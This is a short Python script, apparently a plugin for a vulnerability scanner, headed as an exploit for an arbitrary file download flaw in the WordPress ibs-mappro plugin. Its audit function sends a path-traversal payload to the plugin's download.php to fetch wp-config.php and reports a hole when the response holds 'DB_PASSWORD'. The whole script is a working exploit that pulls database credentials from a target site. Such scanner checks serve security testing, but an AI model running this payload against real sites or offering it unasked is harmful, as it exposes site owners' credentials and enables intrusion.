#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'K0thony'
#Exploit Title:Wordpress ibs-mappro Plugin Arbitrary File Download Vulnerability.py
def assign(service,arg):
	if service == "wordpress":
		return True,arg
def audit(arg):
	payload = "wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php"
	verify_url = arg + payload
	code, head, res, errcode, _ = curl.curl(verify_url)
	if code == 200 and 'DB_PASSWORD' in res:
		security_hole(verify_url)

if __name__=='__main__':
	from dummy import *
	audit(assign('wordpress','http://127.0.0.1/')[1])